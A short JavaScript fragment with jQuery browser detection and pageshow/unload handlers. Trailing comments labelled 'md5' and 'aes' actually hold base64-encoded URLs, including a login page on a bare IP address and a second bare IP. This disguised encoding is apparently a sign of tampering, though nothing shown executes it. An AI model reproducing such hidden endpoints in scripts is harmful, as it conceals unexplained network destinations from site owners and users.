if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjkyLjIzNC4xNjM6ODAwOC8jL2xvZ2luL2xvZ2luLGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20saHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/